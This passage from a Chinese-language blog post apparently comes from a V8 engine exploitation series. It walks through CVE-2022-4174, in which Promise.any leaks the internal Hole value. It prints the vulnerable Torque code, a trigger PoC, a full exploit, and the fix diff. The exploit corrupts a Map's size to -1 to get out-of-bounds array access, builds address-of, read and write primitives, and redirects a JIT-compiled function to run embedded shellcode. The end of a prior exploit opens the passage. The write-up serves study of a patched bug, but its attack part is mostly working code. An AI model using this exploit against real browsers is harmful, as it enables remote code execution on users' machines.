<span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> leak_data = <span class="title function_">read</span>(leak_offset);</span><br><span class="line"><span class="keyword">var</span> code = leak_data &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"><span class="keyword">var</span> code_entry_point = leak_data &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(leak_offset, (code &lt;&lt; <span class="number">32n</span>) | (code_entry_point + <span class="number">0x68n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] leak offset: &quot;</span> + <span class="title function_">hex</span>(leak_offset));</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="cve-2022-4174">CVE-2022-4174</h2>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2022-4174" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
环境搭建如下： <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 9.7.106.19</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div> 数组 <code>errors</code>
长度总是设置比所需长度长，而多出来的那个部分的值设为 <code>Hole</code>
。这个数组泄露给用户也就把 <code>Hole</code> 泄露给用户。
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 9. Set errors[index] to x.</span></span><br><span class="line"><span class="type">const</span> newCapacity = <span class="built_in">IntPtrMax</span>(<span class="built_in">SmiUntag</span>(remainingElementsCount), index + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (newCapacity &gt; errors.length_intptr) deferred &#123;</span><br><span class="line">    errors = <span class="built_in">ExtractFixedArray</span>(errors, <span class="number">0</span>, errors.length_intptr, newCapacity);</span><br><span class="line">    *<span class="built_in">ContextSlot</span>(</span><br><span class="line">        context,</span><br><span class="line">        PromiseAnyRejectElementContextSlots::</span><br><span class="line">            kPromiseAnyRejectElementErrorsSlot) = errors;</span><br><span class="line">  &#125;</span><br><span class="line">errors.objects[index] = value;</span><br></pre></td></tr></table></figure></div> 因此有如下 poc： <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v1;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f0</span>(<span class="params">v4</span>) &#123;</span><br><span class="line">        <span class="title function_">v4</span>(<span class="function">() =&gt;</span> &#123; &#125;, <span class="function"><span class="params">v5</span> =&gt;</span> &#123; v1 = v5.<span class="property">errors</span>; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    f0.<span class="property">resolve</span> = <span class="function">(<span class="params">v6</span>) =&gt;</span> &#123; <span class="keyword">return</span> v6; &#125;;</span><br><span class="line">    <span class="keyword">let</span> v3 = &#123;</span><br><span class="line">        <span class="title function_">then</span>(<span class="params">v7, v8</span>) &#123;</span><br><span class="line">            <span class="title function_">v8</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="property">any</span>.<span class="title function_">call</span>(f0, [v3]);</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 该 POC 的过程为： -
通过调用 <code>Promise.any.call(f0, [v3])</code> ，使用
<code>Promise.any</code> 方法来执行异步操作。 - 执行函数 <code>f0</code>
，参数为 <code>v4</code> 类型未知。 - 执行 <code>f0.resolve</code>
函数，参数 <code>v6</code> 即 <code>v3</code> 。 - 执行
<code>then</code> 函数，<code>then</code> 函数第一个参数为
<code>v4</code> 第一个参数，第二个参数未知，但随即会调用 <code>v5</code>
函数。 - 执行 <code>v5</code> 函数，取出 <code>v5</code> 的
<code>errors</code> 数组赋值给变量 <code>v1</code> 。</p>
<p>exp 如下： <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> v1;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f0</span>(<span class="params">v4</span>) &#123;</span><br><span class="line">        <span class="title function_">v4</span>(<span class="function">() =&gt;</span> &#123; &#125;, <span class="function"><span class="params">v5</span> =&gt;</span> &#123; v1 = v5.<span class="property">errors</span>; &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    f0.<span class="property">resolve</span> = <span class="function">(<span class="params">v6</span>) =&gt;</span> &#123; <span class="keyword">return</span> v6; &#125;;</span><br><span class="line">    <span class="keyword">let</span> v3 = &#123;</span><br><span class="line">        <span class="title function_">then</span>(<span class="params">v7, v8</span>) &#123;</span><br><span class="line">            <span class="title function_">v8</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="property">any</span>.<span class="title function_">call</span>(f0, [v3]);</span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x16</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div> 该漏洞修复<a class="link" 
 href="https://chromium.googlesource.com/v8/v8/+/8b35091b2d244c975975e1c78e4cd09cb479b5dc%5E!/#F0" >补丁 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>如下：
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/promise-any.tq b/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="comment">index ffb285a..7e707e6 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/promise-any.tq</span></span><br><span class="line"><span class="meta">@@ -119,7 +119,19 @@</span></span><br><span class="line">           kPromiseAnyRejectElementRemainingSlot);</span><br><span class="line"> </span><br><span class="line">   // 9. Set errors[index] to x.</span><br><span class="line"><span class="deletion">-  const newCapacity = IntPtrMax(SmiUntag(remainingElementsCount), index + 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // The max computation below is an optimization to avoid excessive allocations</span></span><br><span class="line"><span class="addition">+  // in the case of input promises being asynchronously rejected in ascending</span></span><br><span class="line"><span class="addition">+  // index order.</span></span><br><span class="line"><span class="addition">+  //</span></span><br><span class="line"><span class="addition">+  // Note that subtracting 1 from remainingElementsCount is intentional. The</span></span><br><span class="line"><span class="addition">+  // value of remainingElementsCount is 1 larger than the actual value during</span></span><br><span class="line"><span class="addition">+  // iteration. So in the case of synchronous rejection, newCapacity is the</span></span><br><span class="line"><span class="addition">+  // correct size by subtracting 1. In the case of asynchronous rejection this</span></span><br><span class="line"><span class="addition">+  // is 1 smaller than the correct size, but is not incorrect as it is maxed</span></span><br><span class="line"><span class="addition">+  // with index + 1.</span></span><br><span class="line"><span class="addition">+  const newCapacity =</span></span><br><span class="line"><span class="addition">+      IntPtrMax(SmiUntag(remainingElementsCount) - 1, index + 1);</span></span><br><span class="line">   if (newCapacity &gt; errors.length_intptr) deferred &#123;</span><br><span class="line">       errors = ExtractFixedArray(errors, 0, errors.length_intptr, newCapacity);</span><br><span class="line">       *ContextSlot(</span><br><span class="line"><span class="meta">@@ -306,6 +318,7 @@</span></span><br><span class="line">           PromiseAnyRejectElementContextSlots::</span><br><span class="line">               kPromiseAnyRejectElementErrorsSlot);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+      check(errors.length == index - 1);</span></span><br><span class="line">       const error = ConstructAggregateError(errors);</span><br><span class="line">       // 3. Return ThrowCompletion(error).</span><br><span class="line">       goto Reject(error);</span><br></pre></td></tr></table></figure></div></p>
]]></content>
  </entry>
</search>
